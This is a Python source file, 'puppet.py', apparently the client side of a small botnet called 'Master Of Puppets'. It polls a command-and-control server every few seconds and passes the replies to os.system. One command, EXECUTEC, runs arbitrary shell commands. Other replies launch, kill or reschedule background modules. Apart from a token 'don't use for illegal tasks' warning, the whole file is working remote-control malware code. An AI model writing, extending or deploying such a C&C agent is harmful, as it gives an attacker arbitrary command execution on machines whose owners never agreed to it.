#---------------------------------------------#     Filename: puppet.py
#             Master Of Puppets               #
#                                             #     This is puppet part of Master of Puppets.
#               by Commod0re                  #
#                                             #     If you are developing or impoving this program, remove "#" before "print()" in all programs
#                 v. 0.0.1                    #
#                                             #
#---------------------------------------------#

import requests
import time
import os

#------------------WARNING--------------------#

# DONT USE THIS PROGRAM IN ILLEGAL TASKS
# DOES NOT SEPARATE FILES IN THIS DIRECTORY
# IN THIS DIRECTORY ALL DEPENDENCIES

#---------------------------------------------#

#----------------CONFIG ZONE------------------#

COMMANDSERVER = "127.0.0.1:5000"

class timee: TIME_SLEEP = 5

currenttasks = []

#---------------------------------------------#


def launch_module(command):  # launch puppet module
    if command.split(sep=" ")[0] in currenttasks:
        pass
    else:
        currenttasks.append(command.split(sep=" ")[0])
        print(currenttasks)
        print(command)
        os.system("./" + command + " &")


def stop_modules():  # terminate all tasks
    try:
        if currenttasks == []:
            print("[-] Tasklist is empty! Nothing to terminate")
            pass
        else:
            for i in currenttasks:
                print(f"KILL {i}")
                os.system(f"killall {i}")
            currenttasks.clear()

    except Exception:
        print("[-] Killtasks error!")
        pass

def changewait(seconds):
    timee.TIME_SLEEP = seconds


def recieve_command_loop():  # recieve command from C&C, main loop
    while True:
        time.sleep(timee.TIME_SLEEP)
        try:
            r = requests.get(f"http://{COMMANDSERVER}/puppetsapi")
            if r.text == "STOPALL":
                stop_modules()

            elif r.text == "WAIT":
                continue
            
            elif r.text.split(sep=" ")[0] == "SETTIMEWAIT":
                changewait(int(r.text.split(sep=" ")[1]))

            elif r.text.split(sep=" ")[0] == "PRINT":
                print(r.text.split(sep=" ")[1])

            elif r.text.split(sep=" ")[0] == "EXECUTEC":
                os.system(r.text.split(sep=" ")[1])
                
            else:
                print(r.text)
                launch_module(r.text)

            print(currenttasks)

        except Exception:
            print("[-] Mainloop error!")
            pass


recieve_command_loop()  # launch
